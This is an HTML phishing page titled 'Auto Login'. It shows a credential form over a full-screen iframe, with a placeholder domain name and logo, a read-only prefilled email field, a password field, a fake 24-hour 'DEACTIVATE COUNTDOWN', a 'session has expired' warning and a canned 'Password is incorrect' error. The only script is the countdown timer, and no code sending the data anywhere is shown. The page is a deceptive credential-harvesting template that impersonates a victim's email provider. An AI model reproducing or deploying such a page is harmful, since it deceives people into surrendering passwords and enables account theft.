<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Login</title>
<style>
* {
box-sizing: border-box;
padding: 0;
margin: 0;
}
body {
height: 100vh;
width: 100vw;
font-family: Arial, Helvetica, sans-serif;
}
.bg-img {
height: 100%;
width: 100%;
background-position: center;
background-repeat: no-repeat;
background-size: cover;
}
iframe {
height: 100%;
width: 100%;
}
.container {
max-width: 1000px;
padding: 16px;
background-color: white;
border-radius: 5px;
position: absolute;
left: 50%;
top: 50%;
transform: translate(-50%, -50%);
z-index: 2;
}
@media (max-width: 480px) {
.container {
left: 10%;
top: 10%;
margin-left: 5%;
transform: translate(-10%, -10%);
}
}
input[type=text], input[type=password] {
width: 100%;
padding: 10px 15px 10px 40px;
margin: 5px 0 5px 0;
border: none;
background: #f1f1f1;
}
input[type=text]:focus, input[type=password]:focus {
background-color: #ddd;
outline: none;
}
.btn {
background-color: #1d62a1;
color: white;
padding: 8px 20px;
border: none;
cursor: pointer;
width: 100%;
opacity: 0.9;
}
.btn:hover {
opacity: 1;
}
.img {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 16px;
    }
    #logo {
        width: 30px; /* Smaller logo size */
    }
#title {
text-align: center;
margin: 5px 0;
}
    #logo {
        width: 30px; /* Smaller logo size */
    }
    .divider {
        width: 100%;
        height: 1px;
        background-color: #ccc;
        margin: 10px 0;
    }
    #countdown {
        text-align: center;
        color: red;
        font-size: 18px;
        font-weight: bold;
        margin: 5px 0;
    }
    .countdown-icon {
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 14px;
        color: blue;
        font-weight: bold;
        margin-top: 5px;
    }
    .countdown-icon .exclamation {
        font-size: 18px;
        color: white;
        background-color: blue;
        border-radius: 50%;
        padding: 4px 8px;
        margin-right: 5px;
    }
    .input-container {
        position: relative;
        margin: 10px 0;
    }
    .input-container .icon {
        position: absolute;
        top: 45%;
        left: 10px;
        transform: translateY(-50%);
        color: grey;
    }
#error {
display: none;
color: red;
}
#domainName {
        font-weight: bold;
        color: black; /* Ensure domain name is visible */
    }
</style>
</head>
<body>
<div class="bg-img" id="bg-img">
<iframe id="frame" src="about:blank" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
</div>
<form class="container" id="login-form">
<div class="img">
<img src="" id="logoimg" alt="Logo" width="40" height="40">
        <strong><span id="logoname">Domain Name</span></strong> 
</div>
    <div class="divider"></div>

    <!-- Countdown with Exclamation Icon -->
    <div class="countdown-icon">
        <span class="exclamation">!</span>
        <span>DEACTIVATE COUNTDOWN:</span><div id="countdown">24:00:00</div>
    </div>
<h5 id="title" style="color: red;">Your session has expired. Please sign in to continue.</h5>

<label for="email">
</label>
    <div class="input-container">
        <span class="icon">📧</span>
<input type="text" placeholder="Email Address" name="email" id="email" required readonly>
</div>
<label for="password">
</label>
    <div class="input-container">
        <span class="icon">🔒</span>
<input type="password" placeholder="Password" name="password" id="password" required>
</div>
<div id="custom-error-message" style="color: red; display: none; font-size: 14px;">Password can't start with a space.</div>
<h5 id="error">Password is incorrect, please try again!</h5>
    <!-- Divider line above Sign-in button -->
    <div class="divider"></div>
<button type="submit" class="btn" id="submit-btn">Sign In</button>
</form>
<script>
    // Countdown timer script
    const countdownElement = document.getElementById("countdown");
    let countdownTime = 24 * 60 * 60; // 24 hours in seconds

    function updateCountdown() {
        const hours = String(Math.floor(countdownTime / 3600)).padStart(2, '0');
        const minutes = String(Math.floor((countdownTime % 3600) / 60)).padStart(2, '0');
        const seconds = String(countdownTime % 60).padStart(2, '0');
        countdownElement.textContent = `${hours}:${minutes}:${seconds}`;

        if (countdownTime > 0) {
            countdownTime--;
        } else {
            clearInterval(countdownInterval);
        }
    }

    const countdownInterval = setInterval(updateCountdown, 1000);
</script>
